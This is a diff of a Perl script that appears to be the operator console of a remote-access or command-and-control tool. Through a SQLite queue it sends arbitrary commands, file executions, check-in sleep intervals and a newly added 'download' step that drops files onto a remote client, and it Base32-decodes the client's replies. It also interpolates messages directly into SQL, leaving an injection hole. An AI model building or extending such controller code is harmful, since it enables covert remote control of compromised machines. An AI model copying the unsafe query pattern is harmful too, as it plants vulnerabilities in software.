@@ -1,11 +1,9 @@
 #!/usr/bin/perl
 ###############################
 # To Do
-# * Check to see if outbound MSG QUEUE has enteries and append users's cmd
 # * Learn how to run once
 # * Check buff sizes both inbound / outbound (MAX 4096)
 # * Get CWD & change prompt 
-# * Get Hostname
 # * Capture ^C
 #
 ###############################
@@ -51,6 +49,10 @@ sub parse_cmd {
 	if ($typed_cmd =~ /^help$/i) {
 		help();
 		return 0;
+	} elsif($typed_cmd =~ /^download (.*)/i) {
+		send_msg("FILENAME:$1", "DOWNLOAD");
+		return 1;
+
 	} elsif($typed_cmd =~ /^sleep (\d+)/) {
 		my $sleep_value = $1;
 		if($sleep_value > 0 && $sleep_value < 61) {
@@ -61,7 +63,6 @@ sub parse_cmd {
 			return 0;
 		}
 	} elsif($typed_cmd =~ /^exec (.*)/i) {
-		#print "NOT IMPELEMNTED YET\n";
 		send_msg($1, "EXEC");
 		return 1;
 	} elsif($typed_cmd =~ /^cd (.*)/i) {
@@ -88,6 +89,7 @@ sub help {
 	print "Available Commands:\tArguments\tDescription\n";
 	print "#######################################################################################################################\n";
 	print "  [cmd]\t\t\t[args]\t\tType any command, like whoami, hostname, etc.\n";
+	print "  download \t\t\t[file]\tDownload a file to remote host at current directory\n";
 	print "  sleep\t\t\t[1...65535]\tSet the client to only check in ever x seconds.\n";
 	print "  exec\t\t\t[file]\t\tExecutes a file as a seperate proccess.\n";
 	print "  debug\t\t\t[on|off]\tEnables or Disables debug messaging to console.\n";
@@ -115,8 +117,7 @@ sub recieve_msg {
         $sth->finish();
         $dbh->disconnect();
 
-	# I dont think we need to have each use case here, we may be able to combine to a sinlge if/else
-	if (($client_cmd eq "SLEEP") or ($client_cmd eq "CMD") or ($client_cmd eq "CWD") or ($client_cmd eq "EXEC")) {
+	if (($client_cmd eq "SLEEP") or ($client_cmd eq "CMD") or ($client_cmd eq "CWD") or ($client_cmd eq "EXEC") or ($client_cmd eq "DOWNLOAD")) {
                 debug("CLIENT COMMAND", $client_cmd);
                 $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                 $sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
@@ -129,62 +130,12 @@ sub recieve_msg {
                                 $return = MIME::Base32::decode($row[0]);
                         }
                 }
-                #print "CLIENT_MSG_QUEUE: $row[0]\n";
-                debug("CLIENT_MSG_QUEUE", "CLEARED");
                 $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
                 $sth->execute();
                 $sth->finish();
                 $dbh->disconnect();
                 return $return;
-	
-	#} elsif ($client_cmd eq "EXEC") {
-        #        debug("CLIENT COMMAND", $client_cmd);
-	#} elsif ($client_cmd eq "CMD") {
-        #        debug("CLIENT COMMAND", $client_cmd);
-	#	$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
-        #	$sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
-        #	$sth->execute();
-
-	#        my @row = $sth->fetchrow_array();
-        #	if (length($row[0]) >  0) {
-        #        	if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
-        #                	debug("ENTRY", MIME::Base32::decode($row[0]));
-	#                        $return = MIME::Base32::decode($row[0]);
-        #	        }
-	#        }
-        	#print "CLIENT_MSG_QUEUE: $row[0]\n";
-	#	debug("CLIENT_MSG_QUEUE", "CLEARED");
-	#        $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
-        #	$sth->execute();
-	#        $sth->finish();
-        #	$dbh->disconnect();
-	#        return $return;
-
-	#} elsif ($client_cmd eq "CWD") { 
-	#	debug("CLIENT COMMAND", $client_cmd);
-        #        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
-        #        $sth = $dbh->prepare("SELECT CLIENT_MSG_QUEUE FROM msg_queue");
-        #        $sth->execute();
-
-        #        my @row = $sth->fetchrow_array();
-        #        if (length($row[0]) >  0) {
-        #                if (($row[0] ne "NULL") && (MIME::Base32::decode($row[0]) ne "NULL")) { # JBEQ = NULL
-        #                        debug("ENTRY", MIME::Base32::decode($row[0]));
-        #                        $return = MIME::Base32::decode($row[0]);
-        #                }
-        #        }
-        #        #print "CLIENT_MSG_QUEUE: $row[0]\n";
-        #        debug("CLIENT_MSG_QUEUE", "CLEARED");
-        #        $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='NULL'");
-        #        $sth->execute();
-        #        $sth = $dbh->prepare("UPDATE cmd_queue SET CLIENT_CMD='NULL'");
-        #        $sth->execute();
-
-	#	$sth->finish();
-        #        $dbh->disconnect();
-        #        return $return;
-	
-	}elsif ($client_cmd eq "NULL") {
+	} elsif ($client_cmd eq "NULL") {
 		return 0;
 	} else {
                 debug("INVALID CLIENT CMD", $client_cmd);
@@ -195,7 +146,7 @@ sub recieve_msg {
 sub send_msg {
 	my $msg = $_[0];
 	my $cmd = $_[1];
-	debug("Queuing srv msg", $msg);
+	debug("Queuing srv msg", $msg . " (" . length($msg) . " bytes)");
 	my $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
         my $sth = $dbh->prepare("UPDATE msg_queue SET SERVER_MSG_QUEUE='$msg'");
         $sth->execute();
@@ -222,23 +173,13 @@ sub shell{
 		} elsif (!$wait_for_rsp) {
 			my $cmd = prompt('x', "SHELL>", '', '');
 			$wait_for_rsp = parse_cmd($cmd);
-			#send_msg($cmd);
-			#$wait_for_rsp = 1;
 		} else {
 			sleep 1;
 		}
 		
-		# Wait untill response?
-		#recieve_msg();
-		#print "SHELL>";
-		#chomp(my $cmd = <STDIN>);
-		#send_msg($cmd);
-		#sleep 1;
 	}
 }
 ###############################
 # Main			      #
 ###############################
 shell();
-#recieve_msg();
-#send_msg("MSG FROM SERVER");
